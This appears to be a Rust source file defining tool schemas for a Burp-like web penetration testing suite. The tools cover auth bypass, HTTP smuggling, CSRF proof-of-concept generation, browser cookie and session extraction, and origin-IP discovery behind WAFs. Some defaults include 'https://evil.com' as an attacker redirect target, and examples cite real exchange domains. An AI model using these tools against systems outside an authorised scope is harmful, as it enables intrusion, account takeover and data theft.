                    "recursive": { "type": "boolean", "default": false, "description": "Recursively discover content in found directories" },
                    "max_depth": { "type": "integer", "default": 3 },
                    "status_filter": { "type": "array", "items": { "type": "integer" }, "description": "Only show these status codes (empty = show all except 404)" },
                    "size_filter": { "type": "string", "description": "Filter by response size (e.g. '>100' or '<1000' or '!=0')" },
                    "max_concurrent": { "type": "integer", "default": 20 },
                    "timeout_ms": { "type": "integer", "default": 5000 },
                    "cookies": { "type": "string" },
                    "custom_headers": { "type": "object" },
                    "follow_redirects": { "type": "boolean", "default": false }
                },
                "required": ["target"]
            }),
        },
        // ─── Smart Decode (Auto-Detect Encoding Chain) ──────────────────
        ToolDef {
            name: "smart_decode".into(),
            description: "Automatically detect and decode encoding chains. Tries Base64, URL, HTML, Hex, JWT, and nested combinations. Decodes multi-layered obfuscation automatically.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "data": { "type": "string", "description": "Data to auto-decode" },
                    "max_depth": { "type": "integer", "default": 5, "description": "Max decoding depth for nested encodings" }
                },
                "required": ["data"]
            }),
        },
        // ─── Full Auto Scan (Recon → Crawl → Audit → Report) ────────────
        ToolDef {
            name: "full_auto_scan".into(),
            description: "Run a complete automated security assessment pipeline: subdomain enumeration → content discovery → active crawling → passive + active vulnerability scanning → report generation. This is equivalent to clicking 'Scan' in Burp Suite with full config.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": { "type": "string", "description": "Target domain or URL to scan" },
                    "scope": { "type": "string", "enum": ["target_only","include_subdomains","full_recon"], "default": "target_only" },
                    "scan_type": { "type": "string", "enum": ["quick","standard","thorough","owasp_top10"], "default": "standard" },
                    "enable_recon": { "type": "boolean", "default": true, "description": "Enable subdomain enumeration" },
                    "enable_crawl": { "type": "boolean", "default": true, "description": "Enable active crawling" },
                    "enable_content_discovery": { "type": "boolean", "default": true, "description": "Enable directory/file brute-force" },
                    "enable_vuln_scan": { "type": "boolean", "default": true, "description": "Enable active vulnerability scanning" },
                    "vuln_checks": {
                        "type": "array",
                        "items": { "type": "string", "enum": ["sqli","xss","ssrf","ssti","xxe","path_traversal","command_injection","cors","headers","cookies","idor","smuggling","open_redirect","all"] },
                        "default": ["all"]
                    },
                    "max_requests": { "type": "integer", "default": 1000 },
                    "authenticated": { "type": "boolean", "default": false },
                    "cookies": { "type": "string" },
                    "custom_headers": { "type": "object" },
                    "generate_report": { "type": "boolean", "default": true }
                },
                "required": ["target"]
            }),
        },
        // ─── Auth Bypass / IDOR Testing ─────────────────────────────────
        ToolDef {
            name: "test_auth_bypass".into(),
            description: "Test for authorization bypasses (IDOR, privilege escalation, BOLA). Send a request as user A, then replay it as user B (or unauthenticated) to detect access control flaws. Essential for finding account takeover, data leakage, and privilege escalation bugs.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "original_request": {
                        "type": "object",
                        "description": "The original authenticated request",
                        "properties": {
                            "method": { "type": "string" },
                            "url": { "type": "string" },
                            "headers": { "type": "object" },
                            "body": { "type": "string" }
                        },
                        "required": ["method", "url"]
                    },
                    "test_type": { "type": "string", "enum": ["remove_auth","swap_user","lower_privilege","change_id","unauthenticated"], "default": "remove_auth" },
                    "attacker_cookies": { "type": "string", "description": "Cookies for the attacker/lower-privilege user" },
                    "attacker_token": { "type": "string", "description": "Auth token for attacker (replaces Authorization header)" },
                    "id_parameter": { "type": "string", "description": "Parameter name containing the resource ID to test (for IDOR)" },
                    "id_values": { "type": "array", "items": { "type": "string" }, "description": "Alternative ID values to test" },
                    "compare_responses": { "type": "boolean", "default": true, "description": "Compare original vs modified responses to detect bypass" },
                    "success_indicators": { "type": "array", "items": { "type": "string" }, "description": "Strings that indicate unauthorized access was granted" }
                },
                "required": ["original_request"]
            }),
        },
        // ─── HTTP Request Smuggling Detection ───────────────────────────
        ToolDef {
            name: "detect_smuggling".into(),
            description: "Detect HTTP Request Smuggling vulnerabilities (CL.TE, TE.CL, TE.TE, H2.CL). Tests for desync between front-end and back-end servers.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": { "type": "string", "description": "Target URL to test" },
                    "techniques": {
                        "type": "array",
                        "items": { "type": "string", "enum": ["cl_te","te_cl","te_te","h2_cl","h2_te","all"] },
                        "default": ["all"]
                    },
                    "timeout_ms": { "type": "integer", "default": 10000, "description": "Timeout for time-based detection" },
                    "safe_mode": { "type": "boolean", "default": true, "description": "Use non-destructive detection only" }
                },
                "required": ["target"]
            }),
        },
        // ─── Secret/Sensitive Data Finder ────────────────────────────────
        ToolDef {
            name: "find_secrets".into(),
            description: "Scan responses and JavaScript files for leaked secrets: API keys, tokens, passwords, internal URLs, AWS keys, private keys, database credentials. Critical for bug bounty reconnaissance.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": { "type": "string", "description": "URL to scan for secrets (or provide text directly)" },
                    "text": { "type": "string", "description": "Direct text to scan for secrets" },
                    "scan_js_files": { "type": "boolean", "default": true, "description": "Also scan linked JavaScript files" },
                    "categories": {
                        "type": "array",
                        "items": { "type": "string", "enum": ["api_keys","aws","gcp","azure","tokens","passwords","private_keys","internal_urls","emails","database","all"] },
                        "default": ["all"]
                    }
                }
            }),
        },
        // ─── CSRF PoC Generator ─────────────────────────────────────────
        ToolDef {
            name: "generate_csrf_poc".into(),
            description: "Generate a Cross-Site Request Forgery (CSRF) proof-of-concept HTML page from a target request. Creates a ready-to-use HTML file that auto-submits the form.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "method": { "type": "string", "enum": ["GET","POST","PUT","DELETE","PATCH"] },
                    "url": { "type": "string", "description": "Target URL" },
                    "body": { "type": "string", "description": "Request body (form data or JSON)" },
                    "content_type": { "type": "string", "description": "Content-Type of the request" },
                    "auto_submit": { "type": "boolean", "default": true },
                    "technique": { "type": "string", "enum": ["form","xhr","fetch","img"], "default": "form" }
                },
                "required": ["method", "url"]
            }),
        },
        // ─── Target Analyzer (Comprehensive Profiling) ──────────────────
        ToolDef {
            name: "analyze_target".into(),
            description: "Perform comprehensive target analysis: technology detection, WAF fingerprinting, HTTP security headers audit, SSL/TLS analysis, server fingerprinting, and attack surface mapping.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": { "type": "string", "description": "Target URL or domain" },
                    "checks": {
                        "type": "array",
                        "items": { "type": "string", "enum": ["technologies","waf","headers","ssl","server","cms","frameworks","all"] },
                        "default": ["all"]
                    }
                },
                "required": ["target"]
            }),
        },
        // ─── Scope Manager ──────────────────────────────────────────────
        ToolDef {
            name: "scope_manage".into(),
            description: "Define and manage target scope: include/exclude hosts, paths, file extensions. All scanning tools respect the defined scope.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "action": { "type": "string", "enum": ["add_include","add_exclude","list","clear","check_url"] },
                    "pattern": { "type": "string", "description": "URL pattern or regex (e.g. '*.example.com' or '/api/*')" },
                    "type": { "type": "string", "enum": ["host","path","extension","regex"], "default": "host" },
                    "url": { "type": "string", "description": "URL to check against scope (for check_url action)" }
                },
                "required": ["action"]
            }),
        },
        // ─── Open Redirect Detector ─────────────────────────────────────
        ToolDef {
            name: "test_open_redirect".into(),
            description: "Test for open redirect vulnerabilities in URL parameters. Tries various bypass techniques for redirect validation.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": { "type": "string", "description": "Target URL with redirect parameter (e.g. https://example.com/login?redirect=)" },
                    "parameter": { "type": "string", "description": "Name of the redirect parameter", "default": "redirect" },
                    "redirect_target": { "type": "string", "description": "Attacker URL to redirect to", "default": "https://evil.com" },
                    "techniques": {
                        "type": "array",
                        "items": { "type": "string", "enum": ["direct","double_url_encode","backslash","at_sign","null_byte","fragment","data_uri","javascript","all"] },
                        "default": ["all"]
                    }
                },
                "required": ["target"]
            }),
        },
        // ─── OAST/Collaborator (Blind Vulnerability Detection) ──────────
        ToolDef {
            name: "oast_generate_payload".into(),
            description: "Generate an OAST (Out-of-Band) payload for blind vulnerability detection. Creates unique DNS/HTTP callback URLs that trigger when a blind SSRF, XXE, SQLi, or command injection is exploited. Equivalent to Burp Collaborator.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "description": { "type": "string", "description": "Description of what this payload tests" },
                    "vuln_type": { "type": "string", "enum": ["blind_sqli","blind_ssrf","blind_xxe","blind_cmdi","blind_xss","blind_ssti","generic"], "description": "Type of blind vulnerability to test" }
                },
                "required": ["description"]
            }),
        },
        ToolDef {
            name: "oast_poll_interactions".into(),
            description: "Poll for OAST interactions (callbacks). Check if any blind payloads triggered DNS/HTTP callbacks from the target server. Essential for confirming blind SSRF, XXE, and SQL injection.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "correlation_id": { "type": "string", "description": "Filter by specific correlation ID from a generated payload" }
                }
            }),
        },
        ToolDef {
            name: "oast_start_server".into(),
            description: "Start the OAST callback server to receive DNS and HTTP interactions from blind vulnerability payloads.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "http_port": { "type": "integer", "default": 8888, "description": "HTTP callback port" }
                }
            }),
        },
        ToolDef {
            name: "oast_get_payloads".into(),
            description: "List all generated OAST payloads and their interaction status. Shows which blind vulnerability tests have received callbacks.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {}
            }),
        },

        // ─── DOM Invader ─────────────────────────────────────────────────
        ToolDef {
            name: "dom_invader".into(),
            description: "Headless DOM XSS detection — scans pages for DOM sink/source patterns and tests parameter reflection".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": { "type": "string", "description": "Target URL to scan for DOM XSS" },
                    "marker": { "type": "string", "description": "XSS probe marker string (default: WONDERXSS)" },
                    "max_pages": { "type": "integer", "description": "Max pages to crawl and test (default: 10)" }
                },
                "required": ["target"]
            }),
        },

        // ─── OAST DNS Server ─────────────────────────────────────────────
        ToolDef {
            name: "oast_start_dns_server".into(),
            description: "Start a DNS callback server for blind out-of-band vulnerability detection".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "port": { "type": "integer", "description": "UDP port for DNS server (default: 8853)" }
                }
            }),
        },

        // ─── OAST SMTP Server ────────────────────────────────────────────
        ToolDef {
            name: "oast_start_smtp_server".into(),
            description: "Start an SMTP callback server for email-based blind vulnerability detection".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "port": { "type": "integer", "description": "TCP port for SMTP server (default: 2525)" }
                }
            }),
        },

        // ─── Collaborator Everywhere ─────────────────────────────────────
        ToolDef {
            name: "collaborator_everywhere".into(),
            description: "Auto-inject OAST payloads into 14+ HTTP headers (Referer, X-Forwarded-For, etc.) to detect blind SSRF/XSS".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": { "type": "string", "description": "Target URL to send injected requests to" },
                    "server_domain": { "type": "string", "description": "OAST callback domain (default: oast.wondersuite.local)" }
                },
                "required": ["target"]
            }),
        },

        // ─── mTLS / Client Certificates ──────────────────────────────────
        ToolDef {
            name: "mtls_send_request".into(),
            description: "Send an HTTP request with client certificate (mTLS) for mutual TLS authentication".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "method": { "type": "string", "enum": ["GET","POST","PUT","DELETE","PATCH","HEAD"] },
                    "url": { "type": "string", "description": "Target URL" },
                    "client_cert_pem": { "type": "string", "description": "PEM-encoded client certificate" },
                    "client_key_pem": { "type": "string", "description": "PEM-encoded private key" },
                    "client_pkcs12_base64": { "type": "string", "description": "Base64-encoded PKCS12/PFX certificate bundle" },
                    "pkcs12_password": { "type": "string", "description": "Password for PKCS12 bundle" },
                    "headers": { "type": "object", "description": "Additional headers" },
                    "body": { "type": "string", "description": "Request body" }
                },
                "required": ["url", "client_cert_pem"]
            }),
        },

        // ─── WebSocket Advanced ──────────────────────────────────────────
        ToolDef {
            name: "websocket_advanced".into(),
            description: "Advanced WebSocket: match & replace rules, frame injection, binary editing".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "action": { "type": "string", "enum": ["add_rule","list_rules","remove_rule","toggle_rule","apply_rules","inject_frame"], "description": "Action to perform" },
                    "name": { "type": "string", "description": "Rule name (for add_rule)" },
                    "direction": { "type": "string", "enum": ["client_to_server","server_to_client","both"], "description": "Traffic direction filter" },
                    "match_pattern": { "type": "string", "description": "Pattern to match in WS messages" },
                    "replace_value": { "type": "string", "description": "Replacement value" },
                    "is_regex": { "type": "boolean", "description": "Treat match_pattern as regex" },
                    "match_type": { "type": "string", "enum": ["text","binary","json"] },
                    "rule_id": { "type": "string", "description": "Rule ID (for remove/toggle)" },
                    "message": { "type": "string", "description": "WS message to apply rules to (for apply_rules)" },
                    "opcode": { "type": "integer", "description": "Frame opcode: 1=text, 2=binary, 8=close, 9=ping, 10=pong" },
                    "payload": { "type": "string", "description": "Frame payload data" },
                    "masked": { "type": "boolean", "description": "Apply masking to frame" }
                },
                "required": ["action"]
            }),
        },

        // ─── Bambda Filtering ────────────────────────────────────────────
        ToolDef {
            name: "bambda_filter".into(),
            description: "Custom traffic filter expressions (Bambda-style). Supports: ==, !=, contains, matches, >, <, starts_with, ends_with".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "expression": { "type": "string", "description": "Filter expression, e.g. \"status == 200 && host contains 'example'\"" },
                    "traffic": { "type": "array", "description": "Optional array of traffic items to filter. If omitted, just validates the expression." }
                },
                "required": ["expression"]
            }),
        },

        // ─── Raw TCP Send ────────────────────────────────────────────────
        ToolDef {
            name: "raw_tcp_send".into(),
            description: "Send raw bytes over TCP/TLS connection. Enables byte-level control for smuggling PoC, custom protocols, and malformed requests. Supports chunked sending with delays between chunks.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "host": { "type": "string", "description": "Target host (e.g. example.com)" },
                    "port": { "type": "integer", "description": "Target port (default: 80, or 443 for TLS)" },
                    "tls": { "type": "boolean", "description": "Use TLS (default: false)" },
                    "data": { "type": "string", "description": "Raw data to send (use \\r\\n for CRLF). Can be full HTTP request." },
                    "data_hex": { "type": "string", "description": "Alternative: send raw hex bytes (e.g. '47455420' for GET)" },
                    "chunks": {
                        "type": "array",
                        "description": "Send data in multiple chunks with delays between them",
                        "items": {
                            "type": "object",
                            "properties": {
                                "data": { "type": "string", "description": "Chunk data to send" },
                                "delay_ms": { "type": "integer", "description": "Delay in ms before sending this chunk" }
                            }
                        }
                    },
                    "read_timeout_ms": { "type": "integer", "description": "How long to wait for response (default: 5000)" },
                    "read_size": { "type": "integer", "description": "Max bytes to read (default: 65536)" }
                },
                "required": ["host"]
            }),
        },

        // ─── HTTP Request Smuggling ──────────────────────────────────────
        ToolDef {
            name: "smuggling_send".into(),
            description: "Send two HTTP requests on the SAME TCP connection for HTTP Request Smuggling detection. Measures timing differential and response splitting. Supports CL.TE, TE.CL, TE.TE techniques with precise byte-level control.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "host": { "type": "string", "description": "Target host" },
                    "port": { "type": "integer", "description": "Target port (default: 443)" },
                    "tls": { "type": "boolean", "description": "Use TLS (default: true)" },
                    "request_a": { "type": "string", "description": "First (smuggling) request - raw HTTP bytes" },
                    "request_b": { "type": "string", "description": "Second (normal) request - raw HTTP bytes" },
                    "delay_between_ms": { "type": "integer", "description": "Delay between request A and B in ms (default: 100)" },
                    "read_timeout_ms": { "type": "integer", "description": "Response read timeout in ms (default: 10000)" },
                    "technique": { "type": "string", "enum": ["cl_te", "te_cl", "te_te", "manual"], "description": "Smuggling technique (manual = send raw)" },
                    "pipeline_mode": { "type": "boolean", "description": "CRITICAL: Send both requests as ONE TCP payload (concatenated) before reading ANY response. This defeats Connection: close from edge servers. Default: false" },
                    "ignore_close": { "type": "boolean", "description": "Force-write Request B even after Response A contains Connection: close. Default: false" },
                    "partial_read_bytes": { "type": "integer", "description": "Only read this many bytes from Response A before sending B (for timing attacks). 0 = read full response." }
                },
                "required": ["host", "request_a", "request_b"]
            }),
        },

        // ─── Differential Timing Attack ──────────────────────────────────
        ToolDef {
            name: "timing_attack".into(),
            description: "Automated differential timing analysis. Sends N baseline requests and N probe requests, measures response times, computes statistical significance (mean, stdev, t-test). Essential for time-based SQLi, smuggling proof, and race conditions.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "baseline_request": {
                        "type": "object",
                        "description": "The normal/baseline HTTP request",
                        "properties": {
                            "method": { "type": "string" },
                            "url": { "type": "string" },
                            "headers": { "type": "object" },
                            "body": { "type": "string" }
                        },
                        "required": ["method", "url"]
                    },
                    "probe_request": {
                        "type": "object",
                        "description": "The probe/attack HTTP request",
                        "properties": {
                            "method": { "type": "string" },
                            "url": { "type": "string" },
                            "headers": { "type": "object" },
                            "body": { "type": "string" }
                        },
                        "required": ["method", "url"]
                    },
                    "iterations": { "type": "integer", "description": "Number of requests per sample (default: 10)" },
                    "warmup": { "type": "integer", "description": "Warmup requests to discard (default: 2)" },
                    "delay_between_ms": { "type": "integer", "description": "Delay between requests (default: 100)" }
                },
                "required": ["baseline_request", "probe_request"]
            }),
        },

        // ─── Browser JavaScript Execution ────────────────────────────────
        ToolDef {
            name: "browser_execute_js".into(),
            description: "Execute JavaScript code in the active browser tab context. Returns the result. Essential for CORS proof-of-concept (fetch with credentials), DOM manipulation, cookie extraction, and client-side testing.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "code": { "type": "string", "description": "JavaScript code to execute in the page context" },
                    "tab_id": { "type": "integer", "description": "Browser tab ID (default: active tab)" },
                    "await_promise": { "type": "boolean", "description": "If true, await the result if it's a Promise (default: true)" },
                    "timeout_ms": { "type": "integer", "description": "Max execution time (default: 10000)" }
                },
                "required": ["code"]
            }),
        },

        // ─── WebSocket Connect ───────────────────────────────────────────
        ToolDef {
            name: "websocket_connect".into(),
            description: "Initiate a new WebSocket connection from scratch. Connect to any wss:// or ws:// endpoint, send frames, receive responses. Keeps connection alive with an ID for subsequent interactions.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "url": { "type": "string", "description": "WebSocket URL (e.g. wss://ws.bitstamp.net)" },
                    "action": { "type": "string", "enum": ["connect", "send", "receive", "close", "list"], "description": "Action to perform" },
                    "connection_id": { "type": "string", "description": "Connection ID for send/receive/close (returned by connect)" },
                    "message": { "type": "string", "description": "Message to send (for send action)" },
                    "headers": { "type": "object", "description": "Custom headers for the upgrade request" },
                    "receive_timeout_ms": { "type": "integer", "description": "How long to wait for incoming messages (default: 5000)" },
                    "max_messages": { "type": "integer", "description": "Max messages to receive before returning (default: 10)" }
                },
                "required": ["action"]
            }),
        },

        // ─── Session From Browser ────────────────────────────────────────
        ToolDef {
            name: "session_from_browser".into(),
            description: "Capture authenticated session from the WonderBrowser. Extracts all cookies, localStorage, and auth tokens from the active browser tab and makes them available for Repeater/Scanner/tools. Bridge between manual browser login and automated testing.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "domain": { "type": "string", "description": "Domain to extract session for (e.g. bitstamp.net)" },
                    "tab_id": { "type": "integer", "description": "Browser tab ID (default: active tab)" },
                    "include_local_storage": { "type": "boolean", "description": "Also capture localStorage values (default: true)" },
                    "include_session_storage": { "type": "boolean", "description": "Also capture sessionStorage values (default: true)" },
                    "auto_apply": { "type": "boolean", "description": "Auto-apply captured session to subsequent requests (default: true)" }
                }
            }),
        },

        // ─── OAST Verify / Callback Check ────────────────────────────────
        ToolDef {
            name: "oast_verify".into(),
            description: "Verify OAST callback server is working by sending a test request to it and checking if it was logged. Also starts the callback server if not running. Returns all logged interactions with full request details.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "action": { "type": "string", "enum": ["self_test", "start_server", "get_interactions", "clear"], "description": "Action to perform" },
                    "port": { "type": "integer", "description": "HTTP callback port (default: 8888)" },
                    "correlation_id": { "type": "string", "description": "Filter interactions by correlation ID" }
                }
            }),
        },

        // ─── DNS Resolve — Origin IP Discovery ───────────────────────────
        ToolDef {
            name: "dns_resolve".into(),
            description: "Resolve domain to IP addresses (A/AAAA/CNAME). Essential for finding origin IPs behind CDN/WAF, testing direct-to-origin connections bypassing CloudFront/Cloudflare edge.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "domain": { "type": "string", "description": "Domain to resolve (e.g. api.robinhood.com)" },
                    "record_types": { "type": "array", "items": { "type": "string", "enum": ["A", "AAAA", "CNAME", "MX", "TXT", "NS", "all"] }, "description": "DNS record types to query (default: all)" }
                },
                "required": ["domain"]
            }),
        },

        // ─── Race Request — ns-Synchronized Parallel Requests ────────────
        ToolDef {
            name: "race_request".into(),
            description: "Send N HTTP requests simultaneously with nanosecond-level synchronization using a barrier. Essential for race condition testing (double-spend, limit bypass, TOCTOU). Each request gets its own TCP connection, all fire at the exact same instant.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "requests": {
                        "type": "array",
                        "description": "Array of requests to send simultaneously",
                        "items": {
                            "type": "object",
                            "properties": {
                                "method": { "type": "string" },
                                "url": { "type": "string" },
                                "headers": { "type": "object" },
                                "body": { "type": "string" }
                            },
                            "required": ["method", "url"]
                        }
                    },
                    "repeat_count": { "type": "integer", "description": "Send the same request N times (alternative to providing an array)" },
                    "template_request": {
                        "type": "object",
                        "description": "Template request when using repeat_count",
                        "properties": {
                            "method": { "type": "string" },
                            "url": { "type": "string" },
                            "headers": { "type": "object" },
                            "body": { "type": "string" }
                        }
                    },
                    "gate_timeout_ms": { "type": "integer", "description": "Max time to wait for all connections to be ready (default: 5000)" }
                },
                "required": ["requests"]
            }),
        },

        // ─── HTTP/2 Support ─────────────────────────────────────────────
        ToolDef {
            name: "h2_detect_support".into(),
            description: "Detect if a server supports HTTP/2 protocol. Tests ALPN negotiation and protocol version.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "url": { "type": "string", "description": "Target URL" }
                },
                "required": ["url"]
            }),
        },
        ToolDef {
            name: "h2_send_request".into(),
            description: "Send an HTTP/2 request with proper pseudo-headers (:method, :path, :authority, :scheme). Supports H2 prior knowledge for direct binary protocol communication.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "url": { "type": "string", "description": "Target URL" },
                    "method": { "type": "string", "enum": ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"] },
                    "headers": { "type": "object", "description": "Additional headers" },
                    "body": { "type": "string", "description": "Request body" },
                    "prior_knowledge": { "type": "boolean", "default": false, "description": "Use HTTP/2 prior knowledge (skip ALPN)" }
                },
                "required": ["method", "url"]
            }),
        },
        ToolDef {
            name: "h2_translate".into(),
            description: "Translate between HTTP/1.1 and HTTP/2 request formats. Converts pseudo-headers, removes hop-by-hop headers, and formats for protocol switching.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "direction": { "type": "string", "enum": ["h1_to_h2", "h2_to_h1"], "description": "Translation direction" },
                    "method": { "type": "string" },
                    "url": { "type": "string" },
                    "headers": { "type": "object" },
                    "body": { "type": "string" }
                },
                "required": ["direction", "method", "url"]
            }),
        },

        // ─── OSINT Tools (Zero API Keys) ────────────────────────────────
        ToolDef {
            name: "crtsh_search".into(),
            description: "Search Certificate Transparency logs via crt.sh to enumerate subdomains and certificates for a domain. No API key required. Returns subdomains, certificate details, and issuers.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "domain": { "type": "string", "description": "Target domain (e.g. example.com)" },
                    "include_expired": { "type": "boolean", "default": false, "description": "Include expired certificates" },
                    "resolve_dns": { "type": "boolean", "default": false, "description": "Verify subdomains via DNS A/AAAA lookup" }
                },
                "required": ["domain"]
            }),
        },
        ToolDef {
            name: "wayback_lookup".into(),
            description: "Query the Wayback Machine CDX API to discover historical URLs, deleted endpoints, old API versions, and archived files for a domain. No API key required.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "domain": { "type": "string", "description": "Target domain (e.g. example.com)" },
                    "match_type": { "type": "string", "enum": ["domain", "prefix", "host", "exact"], "default": "domain" },
                    "filter_interesting": { "type": "boolean", "default": true, "description": "Prioritize interesting endpoints (/api/, .env, .git, admin, config)" },
                    "limit": { "type": "integer", "default": 500, "description": "Max results to return" }
                },
                "required": ["domain"]
            }),
        },
        ToolDef {
            name: "whois_lookup".into(),
            description: "RDAP/WHOIS lookup for domains and IPs. Returns registrar, creation date, nameservers, organization, and network information. No API key required.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": { "type": "string", "description": "Domain name or IP address to look up" }
                },
                "required": ["target"]
            }),
        },
        ToolDef {
            name: "asn_lookup".into(),
            description: "Look up Autonomous System Number (ASN) information for an IP address or ASN. Uses DNS-based lookup (cymru) and RDAP. Returns ASN, organization, country, and IP prefixes. No API key required.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": { "type": "string", "description": "IP address or ASN number (e.g. '1.2.3.4' or 'AS13335')" }
                },
                "required": ["target"]
            }),
        },
        ToolDef {
            name: "favicon_hash".into(),
            description: "Download a website's favicon and compute its MurmurHash3 hash for origin IP discovery. Returns the hash value and search queries for Shodan, FOFA, and ZoomEye. No API key required.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": { "type": "string", "description": "Target URL or domain (e.g. https://example.com or example.com)" }
                },
                "required": ["target"]
            }),
        },
        ToolDef {
            name: "discover_parameters".into(),
            description: "Discover hidden GET/POST parameters on a URL by testing common parameter names and analyzing response differences. Finds debug, admin, token, and other hidden params. No API key required.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": { "type": "string", "description": "Target URL to test for hidden parameters" },
                    "method": { "type": "string", "enum": ["GET", "POST"], "default": "GET" },
                    "wordlist": { "type": "string", "enum": ["small", "medium", "large"], "default": "medium", "description": "Parameter wordlist size (small=50, medium=200, large=500)" }
                },
                "required": ["target"]
            }),
        },
        ToolDef {
            name: "graphql_introspect".into(),
            description: "Attempt GraphQL introspection on a target endpoint. Extracts the full schema including queries, mutations, types, and fields. Essential for finding hidden API operations.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": { "type": "string", "description": "GraphQL endpoint URL (e.g. https://api.example.com/graphql)" },
                    "headers": { "type": "object", "description": "Custom headers (e.g. Authorization)" }
                },
                "required": ["target"]
            }),
        },
        ToolDef {
            name: "js_link_finder".into(),
            description: "Extract URLs, API endpoints, and potential secrets from JavaScript files linked on a webpage. Discovers hidden endpoints, internal APIs, and leaked credentials.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": { "type": "string", "description": "Target URL to analyze (will extract and parse linked JS files)" },
                    "max_js_files": { "type": "integer", "default": 20, "description": "Maximum JS files to analyze" }
                },
                "required": ["target"]
            }),
        },
        ToolDef {
            name: "reverse_ip_lookup".into(),
            description: "Perform reverse DNS (PTR) lookup on an IP address and attempt virtual host discovery by sending requests with different Host headers. No API key required.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "ip": { "type": "string", "description": "IP address to reverse-lookup" },
                    "check_vhosts": { "type": "boolean", "default": false, "description": "Attempt virtual host discovery with common subdomains" }
                },
                "required": ["ip"]
            }),
        },

        // ─── Nuclei Template Engine ─────────────────────────────────────
        ToolDef {
            name: "template_list".into(),
            description: "List available Nuclei vulnerability templates from the built-in library. Filter by category, severity, or tags. Returns template IDs, names, severity levels, and descriptions.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "category": { "type": "string", "description": "Filter by category (cves, exposures, misconfiguration, vulnerabilities, default-logins, takeovers, technologies, fuzzing)" },
                    "severity": { "type": "string", "enum": ["critical", "high", "medium", "low", "info"], "description": "Filter by severity" },
                    "tags": { "type": "string", "description": "Filter by tags (comma-separated, e.g. 'wordpress,rce')" },
                    "limit": { "type": "integer", "default": 50 }
                }
            }),
        },
        ToolDef {
            name: "template_search".into(),
            description: "Full-text search across all Nuclei templates. Searches template IDs, names, descriptions, tags, and CVE references.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "query": { "type": "string", "description": "Search query (e.g. 'wordpress rce', 'CVE-2024', 'git config')" },
                    "limit": { "type": "integer", "default": 30 }
                },
                "required": ["query"]
            }),
        },
        ToolDef {
            name: "template_scan".into(),
            description: "Run Nuclei templates against a target URL. Execute specific templates or entire categories. Returns findings with evidence, severity, and confidence levels.".into(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "target": { "type": "string", "description": "Target URL to scan" },
                    "template_ids": { "type": "array", "items": { "type": "string" }, "description": "Specific template IDs to run" },
                    "category": { "type": "string", "description": "Run all templates in a category" },
                    "tags": { "type": "string", "description": "Run templates matching tags" },
                    "severity_filter": { "type": "array", "items": { "type": "string" }, "description": "Only run templates of these severities" },
                    "max_templates": { "type": "integer", "default": 100 }
                },
                "required": ["target"]
            }),
        },
    ]
}


async fn handle_tool_call(name: &str, params: &serde_json::Value) -> Result<serde_json::Value, String> {
    match name {
        "send_request" => {
            let method = params["method"].as_str().unwrap_or("GET");
            let url = params["url"].as_str().ok_or("Missing url")?;

            let client = reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .build()
                .map_err(|e| e.to_string())?;

            let start = std::time::Instant::now();
            let mut req = match method.to_uppercase().as_str() {
                "GET" => client.get(url),
                "POST" => client.post(url),
                "PUT" => client.put(url),
                "DELETE" => client.delete(url),
                "PATCH" => client.patch(url),
                "HEAD" => client.head(url),
                _ => client.request(reqwest::Method::OPTIONS, url),
            };

            // Add custom headers
            let mut req_headers_str = format!("{} {} HTTP/1.1", method.to_uppercase(), url);
